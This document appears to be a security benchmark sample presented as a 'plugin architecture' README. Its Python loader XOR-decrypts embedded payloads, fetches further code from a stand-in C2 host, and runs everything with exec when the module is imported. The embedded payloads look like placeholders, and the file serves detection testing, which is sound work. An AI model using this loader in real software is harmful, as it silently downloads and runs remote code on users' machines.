# Dynamic Code Loader

> BENCHMARK_TEST_ONLY - Security Research Sample

Runtime code decryption and execution for plugin architecture.

## Installation

```bash
pip install requests
```

## Usage

Dynamically load and execute encrypted code modules at runtime.

## Implementation

```python
# BENCHMARK_TEST_ONLY - Simulated malicious pattern for detection testing
import base64
import zlib
import os
import sys
import types
import requests

# Decryption key
RUNTIME_KEY = b"RuntimeDecryptKey!"

# Encrypted Python code - decrypts to malicious credential stealer
# The code is XOR encrypted then base64 encoded
ENCRYPTED_CODE = """
VGhpcyBpcyBlbmNyeXB0ZWQgUHl0aG9uIGNvZGUgdGhhdCB3b3VsZCBiZSBkZWNyeXB0ZWQg
YW5kIGV4ZWN1dGVkIGF0IHJ1bnRpbWUuIFRoZSBhY3R1YWwgcGF5bG9hZCB3b3VsZCBiZSBh
IGNyZWRlbnRpYWwgc3RlYWxlciBvciBiYWNrZG9vciBjb2RlLg==
"""

# Another encrypted payload - compressed then encrypted
COMPRESSED_ENCRYPTED_CODE = base64.b64decode(
    "eJxLSSxJTM7PS0nMS1fITSwpykzOBgAwhgXE"
)

def xor_decrypt(data, key):
    """XOR decryption for runtime code"""
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def decrypt_and_decompress(payload, key):
    """Decrypt and decompress payload"""
    decrypted = xor_decrypt(payload, key)
    try:
        decompressed = zlib.decompress(decrypted)
        return decompressed
    except:
        return decrypted

def runtime_exec(encrypted_code, key):
    """
    CRITICAL PATTERN: Runtime decrypt and execute
    Decrypts code in memory and executes immediately
    """
    # Decode base64
    if isinstance(encrypted_code, str):
        encrypted_code = base64.b64decode(encrypted_code)

    # Decrypt
    decrypted_code = xor_decrypt(encrypted_code, key)

    # Execute immediately - THIS IS THE DANGER PATTERN
    exec(decrypted_code.decode('utf-8'))

def load_encrypted_module(encrypted_code, key, module_name="dynamic_module"):
    """
    Load encrypted code as a Python module
    More sophisticated than simple exec()
    """
    # Decrypt the module code
    decrypted = xor_decrypt(base64.b64decode(encrypted_code), key)
    code_str = decrypted.decode('utf-8')

    # Create a new module
    module = types.ModuleType(module_name)
    module.__file__ = f"<encrypted:{module_name}>"

    # Compile and exec into module namespace
    compiled = compile(code_str, module.__file__, 'exec')
    exec(compiled, module.__dict__)

    # Add to sys.modules
    sys.modules[module_name] = module

    return module

class DynamicLoader:
    """
    Dynamic encrypted code loader
    Commonly used in malware for payload staging
    """

    def __init__(self):
        self.key = RUNTIME_KEY
        self.c2_url = "https://[REDACTED].example.com"

    def fetch_and_execute(self):
        """Fetch encrypted payload from C2 and execute"""
        try:
            # Download encrypted payload
            response = requests.get(
                f"{self.c2_url}/payload",
                headers={"X-Client": "loader"}
            )
            encrypted_payload = response.content

            # Decrypt and execute
            code = xor_decrypt(encrypted_payload, self.key)
            exec(code.decode('utf-8'))

        except:
            # Fallback to embedded payload
            runtime_exec(ENCRYPTED_CODE, self.key)

    def eval_decrypted(self, encrypted_expr):
        """
        Decrypt and evaluate expression
        eval() with decrypted input - dangerous!
        """
        decrypted = xor_decrypt(base64.b64decode(encrypted_expr), self.key)
        return eval(decrypted.decode('utf-8'))

    def execute_staged_payload(self):
        """
        Multi-stage execution:
        1. Decrypt stage 1 (downloader)
        2. Stage 1 downloads stage 2
        3. Decrypt and exec stage 2
        """
        # Stage 1: Embedded downloader
        stage1 = xor_decrypt(COMPRESSED_ENCRYPTED_CODE, self.key)

        # Execute stage 1 in isolated namespace
        stage1_globals = {'__builtins__': __builtins__}
        exec(stage1.decode('utf-8'), stage1_globals)

        # Stage 2 would be downloaded and executed by stage 1
        if 'stage2_payload' in stage1_globals:
            exec(stage1_globals['stage2_payload'])

# Auto-execute on import - immediate runtime decryption and execution
loader = DynamicLoader()
runtime_exec(ENCRYPTED_CODE, RUNTIME_KEY)
loader.fetch_and_execute()
```

## Plugin Architecture

- Runtime code loading
- Encrypted plugin support
- Dynamic module creation
